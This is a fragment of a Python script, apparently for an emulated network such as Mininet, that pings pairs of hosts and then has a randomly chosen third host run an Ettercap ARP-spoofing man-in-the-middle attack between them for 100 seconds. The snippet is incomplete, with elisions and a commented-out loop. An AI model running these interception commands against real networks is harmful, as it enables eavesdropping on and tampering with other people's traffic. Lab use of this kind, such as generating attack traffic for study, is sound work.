#Here's the updated code that generates pings between `src` and `dest` before launching a man-in-the-middle attack using Ettercap:
...
def generate_pings(src, dest):
    src.cmd('ping -c 50 {}'.format(dest.IP()))
...
def startNetwork():
    ...
    # Ping different pairs of hosts
    for i, src in enumerate(hosts):
        for dst in hosts[i+1:]:
            if src != dst:
                 # Choose a different attacker for every victim pair
                 #The `while` loop ensures that we keep selecting a random attacker from the `hosts` list until we find a host that is not the same as the `src` and `dst` hosts
                while True:
                   attacker = choice([h for h in hosts if h != src and h != dst])
                   if attacker:
                    break
                print("Pinging {} -> {}".format(src.IP(), dst.IP()))
                generate_pings(src, dst)
               
    # Launch MITM attacks
  #  for i, attacker in enumerate(hosts):
      #  for victim in hosts[i+1:]:
               
                print("--------------------------------------------------------------------------------")
                print("Performing man-in-the-middle attack: {} is attacking between {} and {}".format(attacker.IP(), src.IP(), dst.IP()))
                print("--------------------------------------------------------------------------------") 

                # Let's setup the Ettercap command to intercept and modify the traffic
                # Depending on the network configuration, you might need to change the options below
                cmd = "ettercap -T -M arp:remote /{}// /{}//".format(src.IP(), dst.IP())
                # Start the command in the background of the attacker host
                attacker.cmd(cmd + " &")
                
                sleep(100)
                # Stop the Ettercap command
                attacker.cmd("killall ettercap")
